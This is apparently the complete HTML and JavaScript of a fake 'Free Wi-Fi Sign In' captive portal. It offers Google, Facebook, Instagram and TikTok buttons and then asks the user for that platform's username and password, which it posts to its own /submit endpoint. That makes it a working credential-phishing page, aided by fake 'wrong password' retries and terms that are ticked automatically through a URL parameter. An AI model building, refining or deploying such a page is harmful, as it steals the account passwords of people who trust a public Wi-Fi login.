<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <title>Free Wi-Fi Sign In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    /* ——— styles unchanged ——— */
    *{box-sizing:border-box}
    html,body{margin:0;padding:0;min-height:100vh;font-family:Arial, sans-serif;
              background-size:cover;background-position:center;display:flex;flex-direction:column}
    .main{flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
    .container{width:100%;max-width:400px;background:rgba(255,255,255,.75);padding:20px;border-radius:10px;
               box-shadow:0 0 10px rgba(0,0,0,.3);text-align:center}
    h2{margin-top:0}
    .login-btn{width:100%;padding:12px;margin:10px 0;font-size:16px;border:none;border-radius:6px;color:#fff;
               display:flex;align-items:center;justify-content:center;gap:10px}
    .login-btn img{width:20px;height:20px}
    .google{background:#4285F4}.facebook{background:#3b5998}.instagram{background:#C13584}.tiktok{background:#000}
    .form-container{display:none;margin-top:20px}
    .form-control{width:100%;padding:10px;margin-bottom:10px;font-size:16px;border-radius:4px;border:1px solid #ccc}
    .btn-submit{background:#0073e6;color:#fff;border:none;padding:12px;width:100%;font-size:16px;border-radius:4px}
    .terms{font-size:14px;text-align:left;margin:10px 0}
    .footer{text-align:center;padding:10px}
    .footer img{max-width:120px;width:40%;height:auto;opacity:.7}
    @media(max-width:400px){.footer img{width:60%}}
  </style>
</head>
<body>
  <div class="main">
    <div class="container">
      <h2>Connect to Guest Wi-Fi</h2>
      <p>Select a platform to sign in:</p>

      <!-- platform buttons -->
      <button class="login-btn google"   onclick="selectPlatform('Google')">   <img src="/img/google.png">   Google   </button>
      <button class="login-btn facebook" onclick="selectPlatform('Facebook')"> <img src="/img/facebook.png"> Facebook </button>
      <button class="login-btn instagram"onclick="selectPlatform('Instagram')"><img src="/img/instagram.png">Instagram</button>
      <button class="login-btn tiktok"   onclick="selectPlatform('TikTok')">   <img src="/img/tiktok.png">   TikTok   </button>

      <!-- terms -->
      <div class="terms">
        <label><input type="checkbox" id="acceptTerms"> I agree to the
          <a href="/terms.html" target="_blank">Terms and Conditions</a>
        </label>
      </div>

      <!-- login form -->
      <div class="form-container" id="loginForm">
        <p id="platformSelected" style="font-weight:bold;margin-bottom:10px;"></p>
        <p id="error-box" style="color:red;display:none;"></p>

        <form method="POST" action="/submit" onsubmit="return validateForm();">
          <input type="hidden" name="platform" id="platformField">
          <input type="text" name="username" id="username" class="form-control" placeholder="Username" required>
          <input type="password" name="password" class="form-control" placeholder="Password" required>

          <!-- wording change ↓ -->
          <button type="submit" class="btn-submit">Sign in</button>
        </form>
      </div>
    </div>
  </div>

  <div class="footer">
    <img src="/img/poweredByUniFi.svg" alt="Powered by UniFi">
  </div>

  <!-- error handling -->
  <script>
    const params = new URLSearchParams(location.search);
    const errorBox = document.getElementById('error-box');
    const error = params.get('error');
    if(error==='email'){ errorBox.textContent="Please enter a valid email address."; }
    else if(error==='1'){ errorBox.textContent="Wrong username or password. Please try again."; }
    if(error){ errorBox.style.display='block'; document.getElementById('loginForm').style.display='block'; }
  </script>

  <!-- platform selection + validation -->
  <script>
    let selectedPlatform = null;
    function selectPlatform(platform){
      localStorage.setItem('lastPlatform',platform);
      if(!document.getElementById('acceptTerms').checked){
        alert("Please accept the Terms and Conditions first."); return;
      }
      selectedPlatform = platform;
      document.getElementById('platformField').value = platform;

      /* wording change ↓ */
      document.getElementById('platformSelected').textContent = `Signing in with: ${platform}`;

      const usernameInput = document.getElementById('username');
      usernameInput.placeholder = (platform==='Google') ? "Email address"
                                                        : "Phone number, username or email";
      document.getElementById('loginForm').style.display='block';
    }

    function validateForm(){
      if(!document.getElementById('acceptTerms').checked){
        alert("Please accept the Terms and Conditions first."); return false;
      }
      if(!selectedPlatform){ alert("Please select a platform first."); return false; }

      const user = document.getElementById('username').value;
      if(selectedPlatform==='Google' && !user.includes('@')){
        errorBox.textContent="Please enter a valid email address.";
        errorBox.style.display='block'; return false;
      }
      document.getElementById('platformField').value = selectedPlatform;
      return true;
    }
  </script>

  <!-- background fetch + auto-restore -->
  <script>
    window.addEventListener('load', async ()=>{
      let bgPath="/img/bg1.jpg";
      try{
        const res=await fetch('/bg'); if(res.ok){
          const file=(await res.text()).trim();
          if(file) bgPath=`/img/${file}?v=${Date.now()}`;
        }
      }catch(e){ console.warn("bg fetch failed, using default"); }
      document.body.style.backgroundImage=`url('${bgPath}')`;

      const p=params.get('platform');
      if(p){
        document.getElementById('acceptTerms').checked=true; /* auto-accept */
        selectPlatform(p);
      }
    });
  </script>
</body>
</html>
